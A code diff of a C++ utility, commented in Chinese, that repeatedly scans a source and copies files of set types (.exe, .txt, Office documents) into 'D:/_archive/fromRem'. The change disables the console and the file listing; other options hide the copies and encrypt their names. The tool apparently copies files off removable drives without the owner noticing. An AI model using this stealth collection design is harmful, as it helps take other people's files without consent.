@@ -15,26 +15,28 @@ using namespace boost::filesystem;
 const char targetExtension[][32]
 {
 	//要复制的文件的格式
-	//全部文件使用: "*.*"
-	"*.*",
 	".exe",
 	".txt",
 	".pptx",
 	"docx",
 	"xlsx",
+	"ppt"
 };
 
-#define RESERVE_DIRECTORY	true			// * 连同目录一起复制
-#define LOG_FILE			true			// * 日志文件
-#define LF_DESTINATION		""				// * 日志文件输出位置
-#define DELAY_TIME			3				//扫描间隔时间(单位:秒)
-#define SHOW_CONSOLE		true			//是否显示控制台
-#define SHOW_FILES			true			//是否列出文件列表在控制台
-#define OVERWRITER			true			//是否覆盖已有文件
-#define FILENAME_ENCRYPT	true			// * 是否加密文件名(加密方式:键对值)
-#define FNE_MAP_DESTINATION	"D:/1.txt"		//键对值文件位置
-#define HIDE_FILE			true			//隐藏被复制的文件
-#define DESTINATION			"D:/a/b/c/d/file"	//复制文件的目的地(可设置文件名前缀)
+#define RESERVE_DIRECTORY	true	// * 连同目录一起复制
+#define LOG_FILE	true	// * 日志文件
+#define LF_DESTINATION	""	// * 日志文件输出位置
+#define DELAY_TIME	3	//扫描间隔时间(单位:秒)
+#define SHOW_CONSOLE	false	//是否显示控制台
+#define SHOW_FILES	false	//是否列出文件列表在控制台
+#define OVERWRITER	true	//是否覆盖已有文件
+#define FILENAME_ENCRYPT	true	// * 是否加密文件名(加密方式:键对值)
+#define FNE_MAP_DESTINATION	"D:/1.txt"	//键对值文件位置
+#define HIDE_FILE	false	//隐藏被复制的文件
+#define DESTINATION	"D:/_archive/fromRem"	//复制文件的目的地(可设置文件名前缀)
+#define NUMBER_FILE	true	//给文件编号,可防止文件重名
+
+
 //路径使用"/"分割,而不是"\"
 
 ////////////////      控制台      \\\\\\\\\\\\\\\\\
@@ -100,6 +102,8 @@ bool willUseFile(const char* path)
 
 void copyFiles(const char* src)
 {
+	size_t number = 0;
+
 	for (recursive_directory_iterator iter(path(src, native)), end; iter != end; iter++)
 	{
 		if (!is_directory(*iter))
@@ -113,6 +117,13 @@ void copyFiles(const char* src)
 					strcat_s(srcFilePath, 1024, iter->path().relative_path().string().c_str());
 					char desFilePath[1024]{};
 					strcat_s(desFilePath, 1024, DESTINATION);
+					if (NUMBER_FILE)
+					{
+						char numberChar[32]{};
+						_itoa_s(number++, numberChar, 32, 10);
+						strcat_s(desFilePath, 1024, numberChar);
+						strcat_s(desFilePath, 1024, ".");
+					}
 
 					//encrypt
 
@@ -140,7 +151,7 @@ void copyFiles(const char* src)
 							}
 							else if (GetFileAttributesA(desFilePath) & FILE_ATTRIBUTE_HIDDEN)
 							{
-								cout << "文件已存在，是隐藏文件" << endl;
+								cout << "|EXISTED (HIDDEN)| " << srcFilePath << desFilePath << endl;
 							}
 							else
 							{
@@ -149,11 +160,9 @@ void copyFiles(const char* src)
 						}
 					}
 
-					//此处存在一个bug，开启隐藏文件且复制失败会导致输出 "(HIDDEN)| "。。。。
-
 					if (HIDE_FILE)
 					{
-						if (SetFileAttributesA(desFilePath, FILE_ATTRIBUTE_HIDDEN) && SHOW_FILES)
+						if (SetFileAttributesA(desFilePath, FILE_ATTRIBUTE_HIDDEN) && SHOW_FILES && copySuccess)
 							cout << "(HIDDEN)| " << srcFilePath << " -> " << desFilePath << endl;
 					}
 
